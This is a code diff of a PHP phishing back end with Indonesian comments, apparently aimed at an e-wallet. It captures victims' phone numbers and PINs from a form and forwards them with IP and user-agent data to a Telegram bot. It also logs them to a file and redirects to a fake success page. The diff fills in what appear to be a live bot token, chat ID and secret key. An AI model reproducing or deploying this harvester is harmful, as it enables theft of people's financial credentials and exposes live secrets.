@@ -1,8 +1,8 @@
 <?php
 // CONFIG - GANTI DENGAN PUNYA LU!
-$BOT_TOKEN = 'TOKEN_BOT_TELEGRAM_KAMU';  // Ganti!
-$CHAT_ID = 'ID_CHAT_TELEGRAM_KAMU';      // Ganti!
-$SECRET_KEY = 'rahasia123';              // Ganti dengan kode rahasia
+$BOT_TOKEN = '8571755096:AAGK4pH7C70ZdGcIkyjW4H4uOLU_CRqACgc';
+$CHAT_ID = '6014932831';
+$SECRET_KEY = 'ovo_natal_12';
 
 // Tangkap data dari form
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -11,7 +11,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
     $userAgent = $_SERVER['HTTP_USER_AGENT'];
     $time = date('Y-m-d H:i:s');
-    
+
     // Validasi data
     if (!empty($phone) && !empty($pin)) {
         // Format pesan untuk Telegram
@@ -22,7 +22,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $message .= "🕒 Waktu: $time\n";
         $message .= "🖥️ User Agent: $userAgent\n";
         $message .= "────────────────────";
-        
+
         // Kirim ke Telegram
         $telegramUrl = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
         $telegramData = [
@@ -30,7 +30,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             'text' => $message,
             'parse_mode' => 'HTML'
         ];
-        
+
         // Gunakan cURL untuk kirim data
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $telegramUrl);
@@ -39,11 +39,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         $result = curl_exec($ch);
         curl_close($ch);
-        
+
         // Simpan ke file log (opsional)
         $logData = "[$time] $phone | $pin | $ip\n";
         file_put_contents('data_log.txt', $logData, FILE_APPEND);
-        
+
         // Redirect ke halaman sukses palsu
         header('Location: success.html');
         exit();
@@ -63,3 +63,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <a href="index.html">Kembali</a>
 </body>
 </html>
+
+
+
+
+
